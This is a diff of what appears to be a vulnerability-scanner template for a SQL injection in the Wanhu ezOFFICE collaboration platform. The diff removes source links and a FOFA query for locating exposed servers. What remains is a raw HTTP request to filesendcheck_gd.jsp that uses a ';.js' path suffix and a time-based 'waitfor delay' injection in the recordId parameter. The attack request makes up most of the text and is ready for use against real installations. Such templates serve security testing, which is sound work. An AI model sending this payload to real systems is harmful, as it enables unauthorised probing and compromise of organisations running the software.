@@ -3,12 +3,8 @@ info:
   name: 万户ezOFFICE协同管理平台filesendcheck_gd存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/spavgzgiz1gg17ar'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: spavgzgiz1gg17ar
-    fofa: app="万户网络-ezOFFICE" || body="/defaultroot/"
 http:
 - raw:
   - 'GET /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+''0:0:3''-- HTTP/1.1
